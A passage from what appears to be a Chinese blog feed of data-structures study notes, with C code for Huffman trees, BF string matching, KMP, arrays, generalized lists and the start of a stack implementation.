class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 30</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> CHUNKSIZE 80</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdio.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdlib.h&quot;</span></span><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">HTNode</span> &#123;</span><br>    <span class="hljs-type">int</span> weight;<br>    <span class="hljs-type">int</span> parent, lch, rch;<br>&#125; HTNode, *HuffmanTree;<br><span class="hljs-comment">//采用双亲表示法，但是会记录左右孩子的位置</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Select</span><span class="hljs-params">(HTNode *htNodes, <span class="hljs-type">int</span> size, <span class="hljs-type">int</span> *min1, <span class="hljs-type">int</span> *min2)</span> &#123;<br>    <span class="hljs-comment">//以下算法用于去出较次和最次的元素</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> ((htNodes + i)-&gt;parent == <span class="hljs-number">0</span><br>            &amp;&amp; (htNodes + i)-&gt;weight &lt; (htNodes + *min1)-&gt;weight) &#123;<span class="hljs-comment">//确保每小权的结点已经被选用</span><br><br>            *min2 = *min1;<br>            *min1 = i;<br>        &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((htNodes + i)-&gt;parent == <span class="hljs-number">0</span><br>                   &amp;&amp; (htNodes + i)-&gt;weight &lt; (htNodes + *min2)-&gt;weight<br>                   &amp;&amp; i != *min1) &#123;<br><br>            *min2 = i;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">initMin</span><span class="hljs-params">(HTNode* htNodes,<span class="hljs-type">int</span> size,<span class="hljs-type">int</span> *min1,<span class="hljs-type">int</span> *min2)</span>&#123;<br>    <span class="hljs-comment">//重置最小值，防止取出来的最小值是已经被选过的</span><br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span>((htNodes+i)-&gt;parent==<span class="hljs-number">0</span>)&#123;<br>            *min1=i++;<span class="hljs-comment">//break使得++i失效</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span>(;i&lt;size;++i)&#123;<br>        <span class="hljs-keyword">if</span>((htNodes+i)-&gt;parent==<span class="hljs-number">0</span>)&#123;<br>            *min2=i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br>status <span class="hljs-title function_">creatNode</span><span class="hljs-params">(HTNode *htNodes, <span class="hljs-type">int</span> *nums, <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> min1 = <span class="hljs-number">0</span>, min2 = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> size1;<br>    size1 = size * <span class="hljs-number">2</span> - <span class="hljs-number">1</span>;<br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">for</span> (; i&lt;size; ++i) &#123;<br>        (htNodes + i)-&gt;weight = *(nums + i);<br>        (htNodes + i)-&gt;lch = <span class="hljs-number">0</span>;<br>        (htNodes + i)-&gt;rch = <span class="hljs-number">0</span>;<br>        (htNodes + i)-&gt;parent = <span class="hljs-number">0</span>;<span class="hljs-comment">//一定要将parent重置为0</span><br>    &#125;<br><br>    <span class="hljs-keyword">for</span> (; i &lt; size1 ; ++i) &#123;<br>        initMin(htNodes,i,&amp;min1,&amp;min2);<br>        Select(htNodes, i, &amp;min1, &amp;min2);<br>        (htNodes + i)-&gt;weight = (htNodes + min1)-&gt;weight + (htNodes + min2)-&gt;weight;<br>        (htNodes + i)-&gt;lch = min1;<br>        (htNodes + i)-&gt;rch = min2;<br>        (htNodes + i)-&gt;parent = <span class="hljs-number">0</span>;<br>        (htNodes + min1)-&gt;parent = i;<br>        (htNodes + min2)-&gt;parent = i;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">int</span> num;<br>    <span class="hljs-type">int</span> nums[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> tem;<br>    HTNode htNodes[<span class="hljs-number">100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<span class="hljs-comment">//注意这里使用变量，不使用指针</span><br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;num);<span class="hljs-comment">//num最大是5，因为，2n-1留一个0不用</span><br><span class="hljs-comment">/*    if(num&gt;5)&#123;</span><br><span class="hljs-comment">        printf(&quot;num too large&quot;);</span><br><span class="hljs-comment">        exit(-1);</span><br><span class="hljs-comment">    &#125;*/</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; num; ++i) &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>, &amp;tem);<br>        nums[i] = tem;<br>    &#125;<br>    creatNode(htNodes, nums, num);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">2</span>*num<span class="hljs-number">-1</span>; ++i) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,htNodes[i].weight);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ol><h4 id="哈曼树的运用"><a href="#哈曼树的运用" class="headerlink" title="哈曼树的运用"></a>哈曼树的运用</h4><h5 id="哈夫曼编码"><a href="#哈夫曼编码" class="headerlink" title="哈夫曼编码"></a>哈夫曼编码</h5><ol><li><p>设计一种任意的编码都不是另一个编码的前缀</p><p>如A(0)是B(00)的前缀</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%93%88%E5%A4%AB%E6%9B%BC%E7%BC%96%E7%A0%81.png"></p></li><li><p>通过哈夫曼编码使得电文最短</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A6%82%E4%BD%95%E4%BD%BF%E5%BE%97%E7%94%B5%E6%96%87%E7%9A%84%E6%9C%80%E7%9F%AD.png"></p><p>将要传输的字符出现的频率当作权值</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/%E5%A6%82%E4%BD%95%E4%BD%BF%E5%BE%97%E7%94%B5%E6%96%87%E7%9A%84%E6%9C%80%E7%9F%AD.png"></p></li><li><p>问题</p><ul><li><p>为什么哈夫曼编码能确保不是前缀编码？</p><blockquote><p>因为每一个字符都是叶子结点，也就是说，没有哪个叶子是另个一个叶子的前缀，也就是没有相同的路径</p></blockquote></li><li><p>为什么哈夫曼树能确保字符编码总长最短？</p><blockquote><p>才用权的方式，权重大的离根节点更近，所以形成的编码最短。换句话说哈夫曼树的加权路径最短</p></blockquote></li></ul></li><li><p>性质</p><ul><li>哈夫曼编码是前缀码</li><li>而且是最有前缀码</li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>串、数组和广义表</title>
    <link href="/2023/04/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/"/>
    <url>/2023/04/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="串、数组和广义表"><a href="#串、数组和广义表" class="headerlink" title="串、数组和广义表"></a>串、数组和广义表</h1><h2 id="串（字符串string）"><a href="#串（字符串string）" class="headerlink" title="串（字符串string）"></a>串（字符串string）</h2><ol><li><p>是一个内容受限的线性表（只能存放字符）</p></li><li><p>子串</p><p>例如<code>abcd</code>的的子串</p><p>“ ”  “a”  “ab”  ……..</p></li><li><p>子串在主串当中的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E5%AD%90%E4%B8%B2%E5%9C%A8%E4%B8%BB%E4%B8%B2%E7%9A%84%E4%BD%8D%E7%BD%AE.png"></p></li><li><p>所有的空串都是相等的 </p></li><li><p>一般选用顺序的</p></li></ol><h3 id="串的顺序实现"><a href="#串的顺序实现" class="headerlink" title="串的顺序实现"></a>串的顺序实现</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SString</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[MAXSIZE];<br>    <span class="hljs-type">int</span> Length;<br>&#125;SString;<br></code></pre></td></tr></table></figure><h3 id="串的链式实现"><a href="#串的链式实现" class="headerlink" title="串的链式实现"></a>串的链式实现</h3><ol><li><p>优点</p><blockquote><p>操作方便</p></blockquote></li><li><p>缺点</p><blockquote><p>存储密度较低 </p></blockquote><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E4%B8%B2%E7%9A%84%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9.png"></p></li><li><p>块链的是实现</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>&#123;</span><br>    <span class="hljs-type">char</span> ch[CHUNKSIZE];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Chunk</span>* <span class="hljs-title">next</span>;</span><br>&#125;Chunk;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">LString</span>&#123;</span><br>    Chunk *head,*tail;<br>    <span class="hljs-type">int</span> curlen;<br>&#125;LString;<br></code></pre></td></tr></table></figure></li></ol><h3 id="串的模式匹配算法"><a href="#串的模式匹配算法" class="headerlink" title="串的模式匹配算法"></a>串的模式匹配算法</h3><h3 id="BF算法"><a href="#BF算法" class="headerlink" title="BF算法"></a>BF算法</h3><ol><li><p>时间复杂度为<code>O(n*m)</code></p></li><li><p>代码示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SString</span> &#123;</span><br>    <span class="hljs-type">char</span> ch[MAXSIZE];<br>    <span class="hljs-type">int</span> Length;<br>&#125; SString;<br><br>status <span class="hljs-title function_">InitString</span><span class="hljs-params">(SString *<span class="hljs-built_in">string</span>)</span> &#123;<br>    <span class="hljs-built_in">memset</span>(<span class="hljs-built_in">string</span>-&gt;ch, <span class="hljs-number">0</span>, MAXSIZE);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-built_in">string</span>-&gt;ch);<br>    <span class="hljs-built_in">string</span>-&gt;Length = <span class="hljs-built_in">strlen</span>(<span class="hljs-built_in">string</span>-&gt;ch);<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">BFMatchingAlorithm</span><span class="hljs-params">(SString *<span class="hljs-built_in">string</span>, <span class="hljs-type">char</span> *str)</span> &#123;<br>    <span class="hljs-type">int</span> len = <span class="hljs-built_in">string</span>-&gt;Length;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>, j = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (i &lt; <span class="hljs-built_in">string</span>-&gt;Length &amp;&amp; j &lt; <span class="hljs-built_in">strlen</span>(str)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">string</span>-&gt;ch[i] == str[j]) &#123;<br>            ++i;<br>            ++j;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            i = i - j + <span class="hljs-number">1</span>;<br>            j = <span class="hljs-number">0</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (j == <span class="hljs-built_in">strlen</span>(str)) &#123;<br>        <span class="hljs-keyword">return</span> i - j;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><span class="hljs-comment">/*    for (int i = 0,j=0; i &lt; len; ++i) &#123;</span><br><span class="hljs-comment">        if(string-&gt;ch[i]==str[j])&#123;</span><br><span class="hljs-comment">            while(j&lt; strlen(str)&amp;&amp;string-&gt;ch[i]!=&#x27;\0&#x27;)&#123;</span><br><span class="hljs-comment">                if(string-&gt;ch[i]!=str[j])&#123;</span><br><span class="hljs-comment">                    i=i-j+1;</span><br><span class="hljs-comment">                    j=0;</span><br><span class="hljs-comment">                    break;</span><br><span class="hljs-comment">                &#125;</span><br><span class="hljs-comment">                i++;</span><br><span class="hljs-comment">                j++;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">            if(j== strlen(str))&#123;</span><br><span class="hljs-comment">                return i-j;</span><br><span class="hljs-comment">            &#125;</span><br><span class="hljs-comment">        &#125;</span><br><span class="hljs-comment">    &#125;</span><br><span class="hljs-comment">    return -1;*/</span><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    SString <span class="hljs-built_in">string</span>;<br>    <span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br>    <span class="hljs-type">char</span> str[<span class="hljs-number">10</span>];<br>    InitString(&amp;<span class="hljs-built_in">string</span>);<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, str);<br>    sub = BFMatchingAlorithm(&amp;<span class="hljs-built_in">string</span>, str);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, sub);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li><li><p>注意事项</p><ul><li>注意回溯的<code>i</code>的计算公式</li></ul></li></ol><h3 id="KMP算法"><a href="#KMP算法" class="headerlink" title="KMP算法"></a>KMP算法</h3><ol><li><p>计算<code>next</code>的值</p><ul><li>第一个元素<code>next</code>为<code>0</code></li><li>第二个元素<code>next</code>比较前面一个元素，就是<code>1</code></li><li>其他元素比较前缀的子串</li></ul><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/KMP%E7%AE%97%E6%B3%95%E7%9A%84next%E5%80%BC%E7%9A%84%E8%BF%90%E7%AE%97.png"></p></li><li></li></ol><h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><ol><li><p>定长的线性表</p></li><li><p>相同的元素</p></li><li></li><li><p>结构是固定</p></li><li><p>三维数组的存储</p><p>例如<code>arr[i][j][k]</code></p><ul><li><p><code>arr[x][y][z]</code></p><p>意思就是说，第<code>z</code>页的第<code>x,y</code>号元素</p><p>内存为<code>arr+z*x*y+x*y+y</code></p></li></ul></li><li><p>稀疏矩阵的存储</p><p>采用三元法(i,j,元素)</p><p>既是只存放有元素的位置</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E4%B8%89%E5%85%83%E7%BB%84%E6%B3%95%E4%BC%98%E7%BC%BA%E7%82%B9.png"></p></li><li><p>三角矩阵</p><p>采用的是存一边的方法</p></li><li><p>对称矩阵</p><p>采用三角矩阵的存法</p></li></ol><h2 id="广义表"><a href="#广义表" class="headerlink" title="广义表"></a>广义表</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p><ol><li><p>每个元素可以不同</p></li><li><p>一般用大写的字母表示广义表，小写的字母表示表的元素</p></li><li><p>递归的广义表</p></li><li><p>广义表的深度</p><p>可以大概理解为，完整括号的个数</p></li><li><p>广义表的性质</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p></li><li><p>广义表的种类</p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E4%B8%B2%E3%80%81%E6%95%B0%E7%BB%84%E5%92%8C%E5%B9%BF%E4%B9%89%E8%A1%A8/%E5%B9%BF%E4%B9%89%E8%A1%A8.png"></p></li></ol><h2 id="案例分析与实现"><a href="#案例分析与实现" class="headerlink" title="案例分析与实现"></a>案例分析与实现</h2><ol><li><p>病毒感染检测</p><ul><li><p>将病毒的遗传物质变成复制一份（考虑到病毒的遗传物质是环状的）</p></li><li><p>代码示例（病毒DNA是线状的）</p><p>使用BF</p><p>[代码](<a href="https://github.com/TSY244/cpp_test/commit/82838186490cbdfacb47899ecf70487a44ab4e53">病毒匹配bf · TSY244&#x2F;cpp_test@8283818 (github.com)</a>)</p></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>数据结构和算法</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>栈和队列</title>
    <link href="/2023/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <url>/2023/03/29/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h2 id="栈定义和特点"><a href="#栈定义和特点" class="headerlink" title="栈定义和特点"></a>栈定义和特点</h2><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97%E7%9A%84%E7%89%B9%E7%82%B9.png"></p><ol><li>栈：先进后出</li><li>队列：先进先出（排队的问题）</li></ol><h3 id="顺序栈的表示和操作实现"><a href="#顺序栈的表示和操作实现" class="headerlink" title="顺序栈的表示和操作实现"></a>顺序栈的表示和操作实现</h3><ol><li>约定<code>an</code>端为栈顶，<code>a1</code>端为栈底</li></ol><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ol><li><p>初始化   制造一个空栈</p><p><code>InitStack(&amp;S)</code></p></li><li><p>销毁栈   </p><p><code>DestroyStack(&amp;S)</code></p></li><li><p>判断是否为空</p><p><code>StackEmpty(S)</code></p></li><li><p>求栈的长度</p><p><code>StackLength(S)</code></p></li><li><p>取栈顶的元素</p><p><code>GetTop(S,&amp;e)</code></p></li><li><p>栈的置空操作</p><p><code>ClearStack(&amp;S)</code></p></li><li><p>入栈操作</p><p><code>Push(&amp;S,e)</code></p></li><li><p>出栈操作</p><p><code>Pop(&amp;S,&amp;e)</code></p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E6%A0%88%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.png"></p></li></ol><h4 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h4><ol><li><p>两个指针，一个<code>top</code>指向的是真正的栈顶的上面一个指针，一个<code>base</code>指向的是栈底的地址</p></li><li><p>空栈的标志</p><p><code>top</code>和<code>base</code>都指向的是<code>0</code> </p></li><li><p>栈满的标志</p><p><code>top</code>-<code>base</code>&#x3D;&#x3D;<code>stacksize</code> </p><p><img src="https://chg-1317182407.cos.ap-chengdu.myqcloud.com/%E9%A1%BA%E5%BA%8F%E6%A0%88%E7%9A%84%E8%A1%A8%E7%A4%BA.png"></p></li><li><p>代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> status int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OK 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ERROR (-1)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> true 1</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> false 0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ElemType int</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAXSIZE 50</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> OVERFLOW (-1)</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">SqStack</span>&#123;</span><br>    ElemType* base;<br>    ElemType* top;<br>    <span class="hljs-type">int</span> stackSize;<br>&#125;SqStack;<br><br>status <span class="hljs-title function_">destroyStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack-&gt;base==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>    &#125;<br>    <span class="hljs-built_in">free</span>(sqStack-&gt;base);<br>    sqStack-&gt;stackSize=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">return</span> OK;<br>&#125;<br><br><br>status <span class="hljs-title function_">initStack</span><span class="hljs-params">(SqStack* sqStack)</span>&#123;<br>    <span class="hljs-keyword">if</span>(sqStack==<span class="hljs-literal">NULL</span>)&#123;<br>        <span class="hljs-keyword">return</span> ERROR;<br>  